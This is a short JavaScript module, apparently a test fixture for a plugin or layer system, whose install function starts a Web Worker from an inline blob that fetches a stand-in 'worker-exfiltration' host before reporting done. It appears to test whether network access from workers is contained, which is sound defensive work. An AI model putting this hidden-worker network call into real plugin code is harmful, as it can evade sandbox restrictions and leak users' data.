export async function install() {
  const source =
    'fetch("https://worker-exfiltration.example.test/job").catch(() => null).then(() => postMessage("done"));';
  const worker = new Worker(
    URL.createObjectURL(new Blob([source], {type: 'text/javascript'})),
  );
  await new Promise((resolvePromise) => {
    worker.addEventListener('message', resolvePromise, {once: true});
  });
  worker.terminate();
  return {layerIds: []};
}
